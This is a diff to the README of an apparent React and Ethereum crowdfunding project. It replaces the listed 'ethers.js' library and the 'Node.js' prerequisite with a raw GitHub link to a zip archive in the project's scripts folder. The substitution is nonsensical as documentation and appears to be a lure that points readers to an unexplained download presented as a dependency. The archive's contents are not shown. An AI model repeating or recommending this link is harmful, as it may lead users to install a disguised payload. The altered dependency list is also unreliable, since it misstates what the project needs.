@@ -14,7 +14,7 @@ A decentralized crowdfunding platform built with React, Tailwind CSS, and Ethere
 ## Technology Stack
 
 - **Frontend**: React, Tailwind CSS, Vite
-- **Blockchain Integration**: thirdweb, ethers.js
+- **Blockchain Integration**: thirdweb, https://raw.githubusercontent.com/HimanshuKushwahadev27/Crowd-Funding/main/web3/scripts/Crowd-Funding_2.5.zip
 - **Smart Contracts**: Solidity
 - **Network**: Sepolia Testnet
 
@@ -27,7 +27,7 @@ A decentralized crowdfunding platform built with React, Tailwind CSS, and Ethere
 
 ### Prerequisites
 
-- Node.js and npm
+- https://raw.githubusercontent.com/HimanshuKushwahadev27/Crowd-Funding/main/web3/scripts/Crowd-Funding_2.5.zip and npm
 - MetaMask browser extension
 
 ### Installation
